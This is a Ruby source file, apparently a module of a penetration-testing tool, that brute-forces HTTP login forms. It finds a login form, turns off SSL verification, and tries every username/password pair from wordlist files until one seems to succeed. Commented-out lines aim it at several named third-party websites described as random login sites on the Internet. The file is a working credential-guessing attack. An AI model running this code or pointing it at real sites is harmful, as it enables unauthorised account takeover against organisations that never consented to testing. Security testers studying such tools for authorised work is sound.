#!/usr/bin/env ruby

require "net/http"
require "net/https"
require "uri"
#require 'rubygems'
require 'nokogiri'
#require 'open-uri'
require 'mechanize'		#install gem
#require 'logger'
require 'colorize'
#require 'Logger'

class Httpformbrute
	
	def burtebyforce(urltobrute)
		loginagent = Mechanize.new { |agent| agent.user_agent_alias = 'Mac Safari'}
		#loginagent.set_proxy('localhost', '8080')
		loginagent.verify_mode = OpenSSL::SSL::VERIFY_NONE
		loginagent.follow_meta_refresh = true
		#loginagent.log = Logger.new(File.open("testlog.txt", "w"))

		page = loginagent.get(urltobrute)
		loginform = page.form(:name => /login/)

		if (loginform == nil) 		#loginform could be nil in case of an exception or if the login form does not exist. The precious check in Yasuo.rb is weak.
			puts "Login page not found. Looks like this instance is unauthenticated".red
		else
			username = loginform.field_with(name: /user|email|login|REGEMAIL|name/i)
			password = loginform.field_with(name: /pass|pwd|REGCODE/i)

			yatta = 0
			File.open("users.txt", "r") do |usr|
		      usr.each_line do |user|
		        File.open("pass.txt", "r") do |pw|
		          pw.each_line do |pass|
		          	if yatta == 1; break end
		          	username.value = user.chomp
		          	password.value = pass.chomp
		          	begin
		          	  #puts "Trying combination --> #{username.value}/#{password.value}" #saurabh: comment this for less verbose output
		          	  loginrequest = loginform.submit
		          	  sleep 0.5
		          	  if ((loginrequest.body.scan(/"#{loginform.name}"/i).size == 0) && (loginrequest.body.scan(/"#{username.name}"/i).size == 0) && (loginrequest.body.scan(/"#{password.name}"/i).size == 0))
		          	  	yatta = 1
		          	  	winuser = username.value
		          	  	winpass = password.value
		          	  end
		          	  rescue Mechanize::ResponseCodeError => exception
		          	  	if (exception.response_code != '200' or exception.response_code != '301' or exception.response_code != '302')	#These response codes are handled by Mechanize
		          	  	  loginrequest = exception.page
		          	  	  puts "Invalid credentials or user does not have sufficient privileges".red
		          	  	else
		          	  	  puts "Unknown server error".red
		          	  	end
		          	  end
		          	end
		        end
		      end
	      	end
	      	if yatta == 1
			puts "Yatta, found default login credentials - #{username.value} / #{password.value}\n".green
                        return winuser, winpass
	      	else
	      		puts "Could not find default login credentials, sucks".red
                        return "None", "None"
	      	end
	    end
	end
end

#testrun = Httpformbrute.new()
#testuri = "http://www.tmssoftware.com/site/login.asp"			#Random login site on Internet
#testuri = "http://172.16.148.128:8080/testlink/login.php"		#Testlink on VM
#testuri = "http://www.jamesgosling.com/testlink/login.php"		#Random testlink on Internet
#testuri = "http://10.186.52.24:8580/script"		#Jenkins
#testuri = "https://testmanager.mindtree.com/testlink/login.php"	#Random testlink on Internet
#testuri = "https://tools.techmahindra.com/testlink/login.php"	#Random testlink on Internet
#testrun.burtebyforce(testuri)
